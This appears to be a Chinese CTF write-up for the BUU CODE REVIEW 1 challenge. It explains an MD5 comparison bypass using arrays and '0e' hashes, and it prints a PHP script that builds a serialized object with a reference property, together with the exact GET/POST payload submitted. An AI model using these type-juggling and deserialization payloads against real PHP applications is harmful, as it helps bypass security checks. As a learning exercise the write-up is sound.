# PHP代码审计----（一）

> 题目
> BUU CODE REVIEW 1

打开题目上面显示了PHP源码
![image](https://github.com/uicciu/image/blob/main/php%E5%AE%A1%E8%AE%A1.png)

能看懂这是在传参，应用了GET POST 两种方法 其中还涉及MD5绕过-----这是我能看懂的，上边那一坨是看不懂的

在url输入-----？pleaseget=1
![image](https://github.com/uicciu/image/blob/main/php%E5%AE%A1%E8%AE%A12.png)

很显然没有什么变化

再用hacker插件POST传参

这里我只传了我会的MD5绕过

* MD5绕过
有两种情况

1）MD5无法识别数组，可以传递一个数组，则MD5会返回一个NULL 空 这样两边为空，还是相等的

2）MD5中如果输入0exxx 则会认为是科学计数法 0*10（n） 也是恒为零

> 因为不会了 去看别人思路



【引用】

```
    GET提交：?pleaseget=1

    POST提交的第一部分：pleasepost=2&md51[]=1&md52[]=2

    POST提交的第二部分：一个BUU类的实例化对象，且两个属性值在经过$this->correct = base64_encode(uniqid());这个之后，依然全等，那么这里我们可以把变化的$correct属性的引用赋值   给属性$input

    //uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。

    //传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。

    //引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。
```   



【编写代码】
```php
    <?php

    class BUU{

    public $correct = "";

    public $input = "";

    }

    $chen = new BUU();

    $chen->input=&$chen->correct;

    $chen = serialize($chen);

    echo $chen."<br />";

    //O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

![image](https://github.com/uicciu/image/blob/main/php%E5%AE%A1%E8%AE%A13.png)

【提交】

    GET部分：?pleaseget=1
    
    POST部分：pleasepost=2&md51[]=1&md52[]=2&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
    
       
![image](https://github.com/uicciu/image/blob/main/php%E5%AE%A1%E8%AE%A14.png)
